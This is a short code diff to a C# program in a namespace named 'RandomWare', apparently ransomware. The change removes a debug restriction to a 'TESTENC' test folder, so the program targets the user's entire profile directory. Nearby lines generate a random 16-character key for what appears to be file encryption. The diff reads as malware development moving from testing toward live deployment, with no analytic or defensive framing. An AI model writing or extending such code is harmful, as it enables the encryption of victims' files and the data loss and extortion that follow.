@@ -18,8 +18,8 @@ namespace RandomWare
         [STAThread]
         static void Main()
         {
-            string userpath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
-            +"\\TESTENC"; //DEBUG
+            string userpath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            //+"\\TESTENC"; //DEBUG
             string key = RandomString(16);
 
             DirectoryInfo d = new DirectoryInfo(userpath);
